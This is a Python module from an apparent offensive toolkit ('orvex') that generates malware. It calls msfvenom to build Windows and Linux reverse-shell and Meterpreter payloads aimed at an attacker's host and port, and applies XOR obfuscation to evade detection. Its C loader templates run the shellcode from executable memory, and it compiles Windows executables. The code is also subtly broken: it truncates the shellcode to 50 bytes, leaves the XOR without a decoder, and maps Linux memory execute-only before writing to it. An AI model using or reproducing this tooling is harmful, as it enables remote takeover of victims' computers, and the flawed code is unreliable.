#!/usr/bin/env python3
"""
Payload Generation Engine v2.1.0
"""

import os
import sys
import subprocess
import shutil
from pathlib import Path
from typing import Dict, Any, Optional, Tuple, List
from jinja2 import Environment, FileSystemLoader
from colorama import Fore, Style

from .config import get_config

class PayloadEngine:
    """Moteur de génération de payloads"""
    
    def __init__(self):
        self.config = get_config()
        self.template_dir = Path(__file__).parent.parent / 'templates'
        self.template_dir.mkdir(exist_ok=True)
        self._create_default_templates()
        self.template_env = Environment(loader=FileSystemLoader(str(self.template_dir)))
        self.output_dir = Path.home() / '.orvex' / 'output'
        self.output_dir.mkdir(exist_ok=True, parents=True)
    
    def _create_default_templates(self):
        """Crée les templates par défaut"""
        templates = {
            'windows_loader.c.j2': '''#include <windows.h>
unsigned char payload[] = { {{ shellcode_bytes }} };
int main() {
    void *exec = VirtualAlloc(0, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload, sizeof(payload));
    ((void(*)())exec)();
    return 0;
}''',
            'linux_loader.c.j2': '''#include <stdio.h>
#include <sys/mman.h>
unsigned char payload[] = { {{ shellcode_bytes }} };
int main() {
    void *exec = mmap(NULL, sizeof(payload), PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(exec, payload, sizeof(payload));
    ((void(*)())exec)();
    return 0;
}'''
        }
        
        for name, content in templates.items():
            path = self.template_dir / name
            if not path.exists():
                path.write_text(content)
    
    def generate_payload(self, platform: str, arch: str, payload_type: str,
                        lhost: str, lport: int, evasion: Optional[List[str]] = None,
                        encryption: Optional[str] = None, output: Optional[str] = None,
                        format: str = 'exe') -> Tuple[bool, str]:
        """Génère un payload"""
        
        print(f"{Fore.CYAN}[*] Generating {platform}/{arch} {payload_type}...{Style.RESET_ALL}")
        
        try:
            # Vérifier msfvenom
            if not shutil.which('msfvenom'):
                return False, "msfvenom not found"
            
            # Mapping des payloads
            payload_map = {
                ('windows', 'x64', 'meterpreter'): 'windows/x64/meterpreter/reverse_tcp',
                ('windows', 'x64', 'reverse_tcp'): 'windows/x64/shell_reverse_tcp',
                ('windows', 'x86', 'meterpreter'): 'windows/meterpreter/reverse_tcp',
                ('linux', 'x64', 'reverse_tcp'): 'linux/x64/shell_reverse_tcp',
            }
            
            msf_payload = payload_map.get((platform, arch, payload_type))
            if not msf_payload:
                return False, f"Unsupported payload: {platform}/{arch}/{payload_type}"
            
            # Générer shellcode
            cmd = ['msfvenom', '-p', msf_payload, f'LHOST={lhost}', 
                   f'LPORT={lport}', '-f', 'raw']
            
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode != 0:
                return False, "msfvenom failed"
            
            shellcode = result.stdout
            
            # Appliquer évasion
            if evasion and 'xor' in evasion:
                key = 0xAA
                shellcode = bytes([b ^ key for b in shellcode])
                print(f"{Fore.GREEN}[✓] XOR obfuscation applied{Style.RESET_ALL}")
            
            # Générer loader
            template = self.template_env.get_template(f'{platform}_loader.c.j2')
            shellcode_bytes = ', '.join(f'0x{b:02x}' for b in shellcode[:50])
            if len(shellcode) > 50:
                shellcode_bytes += f', /* ... */'
            
            loader = template.render(shellcode_bytes=shellcode_bytes)
            
            # Sauvegarder
            if output:
                output_path = Path(output)
            else:
                output_path = self.output_dir / f"payload_{platform}.{format}"
            
            source_path = output_path.with_suffix('.c')
            source_path.write_text(loader)
            
            # Compiler
            if platform == 'windows':
                mingw = self.config.get('paths.mingw', 'x86_64-w64-mingw32-gcc')
                if shutil.which(mingw):
                    exe_path = output_path.with_suffix('.exe')
                    subprocess.run([mingw, '-o', str(exe_path), str(source_path), '-s'])
                    if exe_path.exists():
                        output_path = exe_path
            
            print(f"{Fore.GREEN}[✓] Payload generated: {output_path}{Style.RESET_ALL}")
            return True, str(output_path)
            
        except Exception as e:
            return False, str(e)
    
    def cleanup(self):
        """Nettoie les fichiers temporaires"""
        temp_dir = Path('/tmp/orvex')
        if temp_dir.exists():
            shutil.rmtree(temp_dir)
        print(f"{Fore.GREEN}[✓] Cleanup completed{Style.RESET_ALL}")


payload_engine = PayloadEngine()

def get_engine():
    return payload_engine